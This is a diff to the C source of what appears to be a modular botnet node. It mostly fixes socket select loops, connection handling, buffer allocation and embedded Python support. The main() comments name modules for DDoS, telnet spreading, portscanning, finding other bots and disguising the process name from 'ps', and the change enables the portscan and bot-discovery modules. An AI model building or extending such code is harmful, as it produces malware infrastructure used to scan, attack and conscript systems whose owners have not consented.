@@ -52,7 +52,7 @@ from each long standing would help as well
 litecoin,
 dogecoin,etc
 dash,
-namecoin,
+namecoin,   
 eth,nxt,
 peercoin,
 storj
@@ -138,11 +138,11 @@ char my_ip[16] = "\0";
 void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
     // set the fd inside of fd_set
     if (fdset != NULL)
-    FD_SET(fd, fdset);
+        FD_SET(fd, fdset);
     if (fdset2 != NULL)
-    FD_SET(fd, fdset2);
+        FD_SET(fd, fdset2);
     if (fdset3 != NULL)
-    FD_SET(fd, fdset3);
+        FD_SET(fd, fdset3);
     
     *max_fd = MAX(fd + 1, *max_fd);
 }
@@ -158,12 +158,39 @@ SpyFuncs *SpyGet(Modules *mptr) {
     return sptr;
 }
 
+// have to read man pages.. im coding under WSL with windows 10 (linux to windows conversion) therefore
+// i have to double cehck later but gonna use this hack until i get a VM up, or read man pages again
+int is_sock_connected(int fd) {
+    int err = 0;
+    socklen_t size = sizeof (err);
+    int retval = getsockopt (fd, SOL_SOCKET, SO_ERROR, &err, &size);
+
+    if (retval != 0) return 0;
+    if (err != 0) return 0;
+
+    return 1;
+}
+
+
 void OutgoingFlush(Connection *cptr) {
     Queue *qptr = NULL;
     int cur_time = time(0);
     SpyFuncs *sptr = SpyGet(cptr->module);
-    
-    
+    struct in_addr dst;
+    int connected = is_sock_connected(cptr->fd);
+
+    dst.s_addr = cptr->ip;
+    if (connected == 1 && cptr->state == TCP_NEW) {
+    printf("is sock connected? fd %d %d  ip %s [mptr %p] closed %d cptr %p NEW? %d\n", cptr->fd, connected, inet_ntoa(dst), cptr->module, cptr->closed, cptr,
+    cptr->state == TCP_NEW);
+    }
+
+    if ((is_sock_connected == 0) && cptr->state == TCP_NEW) {
+        //printf("NEW is sock connected? fd %d %d  ip %s [mptr %p] closed %d cptr %p\n", cptr->fd, connected, inet_ntoa(dst), cptr->module, cptr->closed, cptr);
+        ConnectionBad(cptr);
+        return;
+    }
+
     // is this a new connection?
     if (cptr->state == TCP_NEW) {
         cptr->state = TCP_CONNECTED;
@@ -190,6 +217,8 @@ void OutgoingFlush(Connection *cptr) {
                 ConnectionBad(cptr);
                 return;
             }
+
+            printf("outgoing flush wrote %d\n", wrote);
             
             // we wrote less than the outgoing buffer
             if (wrote < qptr->size) {
@@ -208,6 +237,7 @@ void OutgoingFlush(Connection *cptr) {
     } else {
         
         // if its supposed to close after.. lets close it..after timeout
+        // 20 seconds is for small files.. we should change this to variation (at least X kb/second) ****
         if (cptr->state == TCP_CLOSE_AFTER_FLUSH) {
             if (cptr->ping_ts == 0) {
                 cptr->ping_ts = cur_time;
@@ -232,7 +262,7 @@ Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *con
     if ((cptr = (Connection *)L_add((LIST **)&newhome->connections, sizeof(Connection))) == NULL)
         return NULL;
     
-    cptr->addr = conn->addr;
+    cptr->addr = cptr->ip = conn->addr;
     cptr->port = conn->port;
     cptr->state = conn->state;
     cptr->fd = conn->fd;
@@ -247,7 +277,9 @@ Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *con
     // remove from original
     // set to 0 so it doesnt close the connection
     conn->fd = 0;
-    cptr->module = NULL;
+
+    // bug was here i think? where it wasnt removing .. lets see
+    //cptr->module = NULL;
     
     // mark as bad to get removed from other functions..
     // when L_del() here created a bug in the loop near select()
@@ -265,6 +297,8 @@ void ConnectionBad(Connection *cptr) {
     int r = 0;
     SpyFuncs *sptr = SpyGet(cptr->module);
     
+    //printf("cptr bad %d\n", cptr->fd);
+
     if (sptr != NULL && sptr->funcs.outgoing != NULL)
         sptr->funcs.outgoing(cptr->module, cptr, NULL, 0);
     
@@ -272,13 +306,14 @@ void ConnectionBad(Connection *cptr) {
     QueueFree(&cptr->incoming);
     QueueFree(&cptr->outgoing);
     
-    if (cptr->module && cptr->module->functions->disconnect) {
+    if (cptr->module && cptr->module->functions->disconnect != NULL) {
         if (sptr != NULL && sptr->funcs.disconnect != NULL)
             sptr->funcs.disconnect(cptr->module, cptr, NULL, 0);
             
         r = cptr->module->functions->disconnect(cptr->module, cptr, NULL, 0);
         // 1 from disconnect means we are reusing...
         if (r == 1) {
+            //printf("we wanna reuse a connection fd %d\n", cptr->fd);
             return;
         }
     }
@@ -291,6 +326,7 @@ void ConnectionBad(Connection *cptr) {
         
     // mark for deletion    
     cptr->closed = 1;
+
     return;
 }
 
@@ -322,6 +358,7 @@ void socket_loop(Modules *modules) {
     int maxfd = 0;
     struct timeval ts;
     int count = 0;
+    struct in_addr dst;
     
     // wait 100 ms for select
     ts.tv_sec = 0;
@@ -343,7 +380,7 @@ void socket_loop(Modules *modules) {
             if ((modcptr->fd == 0) || modcptr->closed)
                 continue;
                 
-            setup_fd(modcptr->state == TCP_NEW ? NULL: &readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
+            setup_fd(modcptr->state == TCP_NEW ? NULL : &readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
             
             count++;    
         }
@@ -358,9 +395,22 @@ void socket_loop(Modules *modules) {
     if (select(maxfd, &readfds, &writefds, &errorfds, &ts) > 0) {
         // loop to check module file descriptors first
         for (mptr = modules; mptr != NULL; mptr = mptr->next) {
+            ConnectionCleanup(&mptr->connections);
             // the module may have several Connection as well
             for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
+                /*if (modcptr->module == NULL) {
+                    printf("connection has noo module but listed! fd %d\n", modcptr->fd);
+                }*/
+                
                 if (FD_ISSET(modcptr->fd, &readfds)) {
+                    if (modcptr->state == TCP_NEW) {
+                        printf("have a new being read\n");
+                        // this was in outgoing flush.. i thought write fds would work properly.. weird
+                        // lets try on read fds.. i can move code later for connections being detected...
+                        OutgoingFlush(modcptr);
+                        continue;
+                    }
+
                     if (modcptr->state == TCP_LISTEN) {
                         // if its listening... its a new connection..
                         // it needs to adopt to its correct module after
@@ -370,14 +420,22 @@ void socket_loop(Modules *modules) {
                         ConnectionRead(modcptr);
                     }
                 }
-                    
-                if (FD_ISSET(modcptr->fd,&writefds)) {
-                    OutgoingFlush(modcptr);
-                }
 
                 if (FD_ISSET(modcptr->fd, &errorfds)) {
                     ConnectionBad(modcptr);
+                    continue;
                 }
+
+                if (FD_ISSET(modcptr->fd,&writefds)) {
+                    dst.s_addr = modcptr->ip;
+                    //printf("write fd on connection fd %d ip %s\n", modcptr->fd, inet_ntoa(dst));
+                    if (modcptr->state == TCP_NEW) {
+                        //printf("writefd have a new with write being possible mptr %p fd %d closed %d\n", mptr, modcptr->fd, modcptr->closed);
+                    }
+                    OutgoingFlush(modcptr);
+                    continue;
+                }
+
             }
         }
     }
@@ -404,10 +462,16 @@ void ConnectionRead(Connection *cptr) {
     int r = 0;
     Queue *newqueue = NULL;
     
+    //printf("connectionread: fd %d\n", cptr->fd);
     // check size waiting
     // maybe find another way.. not sure if ioctl will work everywhere
     ioctl(cptr->fd, FIONREAD, &waiting);    
-    if (!waiting) return;
+
+    // if nothing is waiting.. but we were sent here.. connection must be clossed.
+    if (!waiting) {
+        ConnectionBad(cptr);
+        return;
+    }
 
 
     // lets add a little more just in case a fragment came in
@@ -634,7 +698,7 @@ int QueueMerge(Queue **queue) {
         // calculate size of both
         size = qptr->size + qptr2->size;
         
-        if ((buf = (char *)calloc(size + 1, 1)) == NULL) {
+        if ((buf = (char *)calloc(1, size + 1)) == NULL) {
             return -1;
         }
         
@@ -705,7 +769,7 @@ char *QueueParseAscii(Queue *qptr, int *size) {
 
             if (i < qptr->size) {
                 n = qptr->size - i + 1;
-                newbuf = (char *)calloc(n+1, 1);
+                newbuf = (char *)calloc(1, n+1);
                 if (newbuf == NULL) {
                     //printf("couldnt alloc %d - %d\n", n, errno);
                     return NULL;
@@ -757,6 +821,7 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
                 mptr->functions->plumbing(mptr, NULL, NULL, 0);
                     
         }
+        
         // cleanup stale Connection
         ConnectionCleanup(&mptr->connections);        
 
@@ -820,25 +885,29 @@ Connection *tcp_listen(Modules *mptr, int port) {
     ret->addr = dst.sin_addr.s_addr;
     ret->state = TCP_LISTEN;
     
-    printf("listen  fd %d port %d\n", fd, port);
+    printf("listen fd %d port %d\n", fd, port);
     
     return ret;
 }
+
 
 // custom variables for a python module
 typedef struct _python_module_custom {
     // so we can verify its the correct structure..
     int size;
+#ifdef PYTHON_MODULES
     // if python... this allows to easily kill the script
     PyThreadState *python_thread;
     PyObject *pModule;
+#endif
 } PythonModuleCustom;
+
 
 // not sure if this is necessary.. it could be downright bad..
 // connections already have this inside of some modules..
 void *CustomPtr(Connection *cptr, int custom_size) {
     if (cptr->buf == NULL) {
-        if ((cptr->buf = (char *)calloc(custom_size + 1, 1)) == NULL)
+        if ((cptr->buf = (char *)calloc(1, custom_size + 1)) == NULL)
             return NULL;        
     }
 
@@ -886,9 +955,10 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     //printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);
 
     // lets do this before allocating the connection structure..
-    r = connect(fd, (struct sockaddr *)&dst, sizeof(dst));
+    r = connect(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in));
     
-    if (r == -1 && errno != 36) {
+    if (r == -1 && errno != 115) {
+        //printf("r %d errno = %d\n",r, errno);
         close(fd);
         
         return NULL;
@@ -1020,13 +1090,14 @@ int various_init() {
 
 
 int python_module_deinit(Modules *mptr) {
+#ifdef PYTHON_MODULES
     PythonModuleCustom *evars = (PythonModuleCustom *)ModuleCustomPtr(mptr, sizeof(PythonModuleCustom));
     
     if (evars == NULL) return -1;
     
     if (evars->python_thread)
         Py_EndInterpreter(evars->python_thread);
-        
+#endif        
     return 0;
 }
 
@@ -1183,7 +1254,7 @@ void *ModuleCustomPtr(Modules *eptr, int custom_size) {
 // argument can be NULL.. or it can give the argument :)
 // *** todo: maybe separate python execution environments for each script..
 int PythonModuleExecute(Modules *eptr, char *script_file, char *func_name, PyObject *pArgs) {
-#ifndef NO_PYTHON_MODULES
+#ifdef PYTHON_MODULES
     PyObject *pName=NULL, *pModule=NULL, *pFunc=NULL;
     PyObject *pValue=NULL;
     int ret = 0;
@@ -1250,7 +1321,7 @@ end:;
 
 int python_sendmessage(Modules *mptr, Connection *cptr, char *message, int size) {
     int ret = -1;
-#ifndef NO_PYTHON_MODULES
+#ifdef PYTHON_MODULES
     PyObject *pArgs = NULL;
     PyObject *pMessage = NULL;
     PyObject *pValue = NULL;
@@ -1324,14 +1395,15 @@ int MessageModule(int module_id, Modules *module_list, char *message, int size) 
 // we will use a simple main in the beginning...
 // i want this to be a library, or a very simple node
 int main(int argc, char *argv[]) {
-    int sleep_time = 1500;
+    int sleep_time = 1;
     // initialize modules
+    printf("init modules\n");
     //bitcoin_init(&module_list);
     //litecoin_init(&module_list);
     //namecoin_init(&module_list);
     //peercoin_init(&module_list);
     // portscan should be before anything using it..
-    //portscan_init(&module_list);
+    portscan_init(&module_list);
     // ensure any following modules enable portscans in init
     //telnet_init(&module_list);
     // initialize module for (D)DoS
@@ -1347,17 +1419,22 @@ int main(int argc, char *argv[]) {
     
     // fake name for 'ps'
     //fakename_init(&module_list, argv, argc);
+
     // find bots to ensure connectivity to other nodes
     findbots_init(&module_list);
      
+    printf("main loop\n");
     // main loop
     while (1) {
+        //printf("loop\n");
         Modules_Execute(module_list, &sleep_time);
         
-       usleep(sleep_time);
+        //printf("end execute\n");
+       usleep(sleep_time*1000);
+       //printf("end sleep\n");
         //sleep(5);
     }
-#ifndef NO_PYTHON_MODULES    
+#ifdef PYTHON_MODULES
     Py_Finalize();
 #endif        
 }
